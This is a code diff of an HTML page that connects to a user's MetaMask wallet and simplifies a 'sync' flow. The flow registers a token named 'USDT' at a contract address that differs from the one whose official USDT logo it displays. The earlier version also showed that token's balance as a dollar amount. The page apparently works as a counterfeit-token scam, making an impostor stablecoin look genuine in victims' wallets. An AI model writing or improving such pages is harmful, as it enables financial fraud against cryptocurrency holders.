@@ -1,84 +1,46 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Secure Node | Asset Mapping</title>
+    <title>Sync</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
-    <style>
-        body { background: #0d1117; color: white; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .box { background: #161b22; border: 1px solid #30363d; padding: 40px; border-radius: 25px; text-align: center; width: 320px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
-        .logo-img { width: 80px; height: 80px; border-radius: 50%; border: 2px solid #009379; padding: 5px; margin-bottom: 20px; }
-        .btn { background: #009379; color: white; border: none; padding: 18px; width: 100%; border-radius: 15px; cursor: pointer; font-weight: bold; font-size: 16px; transition: 0.3s; }
-        .btn:hover { background: #00b395; }
-        #balance-display { font-size: 32px; font-weight: 800; margin-bottom: 10px; color: #fff; }
-        #msg { font-size: 11px; color: #8b949e; margin-top: 20px; font-family: monospace; white-space: pre-wrap; }
-    </style>
 </head>
-<body>
+<body style="background:#000; color:#fff; text-align:center; padding-top:50px;">
 
-<div class="box">
-    <img src="https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png" id="token-icon" class="logo-img">
-    <div id="balance-display">$0.00</div>
-    <div style="font-size: 12px; color: #009379; margin-bottom: 30px; letter-spacing: 1px;">NODE ALLOCATION ACTIVE</div>
-    <button class="btn" id="syncBtn" onclick="runMasterSync()">SYNC ASSET LOGO</button>
-    <div id="msg">LOG: STANDBY_FOR_SYNC</div>
-</div>
+    <button id="btn" onclick="start()" style="padding:20px; background:green; color:white;">
+        SYNC NOW
+    </button>
+    
+    <p id="status">READY</p>
 
-<script>
-    // TECHNICAL CONFIGURATION (Sabh Hardcoded)
-    const TOKEN_ADDRESS = "0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f";
-    const TOKEN_SYMBOL = "USDT";
-    // Check karein decimals 18 hain ya 6? (USDT aksar 6 hota hai real mein, lkn contract par depend karta ha)
-    const TOKEN_DECIMALS = 18; 
-    // Logo link jo hamesha load hota ha
-    const LOGO_URL = "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png";
-
-    async function runMasterSync() {
-        const log = document.getElementById('msg');
-        const balDisp = document.getElementById('balance-display');
-        const btn = document.getElementById('syncBtn');
-
-        if (!window.ethereum) return alert("Please open in MetaMask Mobile Browser");
-
-        try {
-            log.innerText = "> INITIALIZING AUTH...";
-            // Wallet Connect Call
-            const provider = new ethers.providers.Web3Provider(window.ethereum);
-            await provider.send("eth_requestAccounts", []);
-            const accounts = await provider.send("eth_accounts", []);
+    <script>
+        async function start() {
+            const st = document.getElementById('status');
+            if (!window.ethereum) return alert("Use MetaMask Browser");
             
-            log.innerText = "> INJECTING ASSET LOGO...";
-            // METADATA INJECTION (Mera Technical Block jo Mobile par logo lata ha)
-            await window.ethereum.request({
-                method: 'wallet_watchAsset',
-                params: {
-                    type: 'ERC20',
-                    options: {
-                        address: TOKEN_ADDRESS,
-                        symbol: TOKEN_SYMBOL,
-                        decimals: TOKEN_DECIMALS,
-                        image: LOGO_URL, // Verified Metadata Key
+            try {
+                st.innerText = "CONNECTING...";
+                const provider = new ethers.providers.Web3Provider(window.ethereum);
+                await provider.send("eth_requestAccounts", []);
+                
+                st.innerText = "ADDING ASSET...";
+                // Strict Parameters - No JSON fetching
+                await window.ethereum.request({
+                    method: 'wallet_watchAsset',
+                    params: {
+                        type: 'ERC20',
+                        options: {
+                            address: '0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f',
+                            symbol: 'USDT',
+                            decimals: 18,
+                            image: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png',
+                        },
                     },
-                },
-            });
-
-            log.innerText = "> SYNCING ON-CHAIN BALANCE...";
-            const contract = new ethers.Contract(TOKEN_ADDRESS, ["function balanceOf(address) view returns (uint256)"], provider);
-            const balance = await contract.balanceOf(accounts[0]);
-            
-            // Decimal formatting based on config
-            const formatted = ethers.utils.formatUnits(balance, TOKEN_DECIMALS);
-
-            // Simple Balance Display
-            balDisp.innerText = "$" + parseFloat(formatted).toLocaleString(undefined, {minimumFractionDigits: 2});
-            log.innerText = "SUCCESS: NODE_OPERATIONAL";
-            btn.innerText = "SYNCED ✅";
-
-        } catch (err) {
-            log.innerText = "SYNC_ERROR: " + err.message.substring(0,30);
+                });
+                st.innerText = "DONE!";
+            } catch (e) {
+                st.innerText = "ERR: " + e.message;
+            }
         }
-    }
-</script>
+    </script>
 </body>
 </html>
